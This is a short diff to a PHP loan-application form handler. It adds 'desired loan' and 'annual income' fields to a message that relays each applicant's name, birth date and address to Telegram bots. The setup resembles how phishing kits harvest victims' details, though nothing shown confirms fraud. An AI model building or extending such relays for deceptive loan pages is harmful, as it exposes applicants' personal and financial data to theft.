@@ -16,6 +16,10 @@ $telegram_bots = [
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Get form inputs
+
+    $desired_loan = htmlspecialchars($_POST['q87_desiredLoan87'] ?? '');
+    $annual_income = htmlspecialchars($_POST['q88_annualIncome'] ?? '');
+
     $name_prefix = htmlspecialchars($_POST['q61_name']['prefix'] ?? '');
     $first_name = htmlspecialchars($_POST['q61_name']['first'] ?? '');
     $last_name = htmlspecialchars($_POST['q61_name']['last'] ?? '');
@@ -123,6 +127,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Prepare message for Telegram
     $telegram_message = "📝 *New Loan Application*\n\n".
+                        "  *Desired Loan:* $desired_loan\n".
+                        "  *Annual Income:* $annual_income\n".
                       "👤 *Name:* $full_name\n".
                       "🎂 *Birth Date:* $birth_date\n".
                       "🏠 *Address:* $address\n".
